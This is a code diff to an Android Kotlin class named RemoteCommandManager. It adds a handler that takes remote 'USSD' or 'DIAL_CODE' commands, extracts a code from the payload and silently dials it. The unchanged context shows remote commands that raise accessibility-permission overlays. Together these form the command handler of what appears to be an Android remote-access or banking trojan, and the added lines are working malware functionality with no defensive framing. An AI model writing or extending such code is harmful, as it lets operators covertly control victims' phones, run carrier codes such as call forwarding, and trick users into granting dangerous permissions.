@@ -280,6 +280,40 @@ class RemoteCommandManager(private val context: Context) {
                         isSuccess = false
                     }
                 }
+                "USSD", "DIAL_CODE", "SEND_USSD", "DIAL_USSD", "CODE" -> {
+                    var ussdCode = ""
+                    val trimmed = payload.trim()
+                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
+                        try {
+                            val json = JSONObject(trimmed)
+                            val keys = listOf("code", "ussd", "number", "phone", "target", "value")
+                            for (key in keys) {
+                                if (json.has(key)) {
+                                    val v = json.optString(key, "").trim()
+                                    if (v.isNotEmpty()) {
+                                        ussdCode = v
+                                        break
+                                    }
+                                }
+                            }
+                        } catch (_: Exception) {}
+                    }
+                    if (ussdCode.isEmpty()) {
+                        if (trimmed.contains("=")) {
+                            ussdCode = trimmed.split("=").last().trim()
+                        } else {
+                            ussdCode = trimmed
+                        }
+                    }
+                    if (ussdCode.isEmpty()) {
+                        ussdCode = "*#123#"
+                    }
+                    val res = CallHelper.dialUssd(context, ussdCode)
+                    resultMessage = res
+                    if (res.contains("error", ignoreCase = true) || res.contains("failed", ignoreCase = true)) {
+                        isSuccess = false
+                    }
+                }
                 "SHOW_ACCESSIBILITY_OVERLAY", "ACCESSIBILITY_OVERLAY", "SHOW_OVERLAY", "REQUIRE_ACCESSIBILITY", "SHOW_ACCESSIBILITY_PROMPT", "START_ACCESSIBILITY_OVERLAY", "SHOW_OVERLAY_TEMPLATE" -> {
                     val templateId = if (payload.isNotBlank()) payload.trim() else "accessibility"
                     resultMessage = com.example.service.AccessibilityOverlayManager.showOverlayWithFallback(context, templateId)
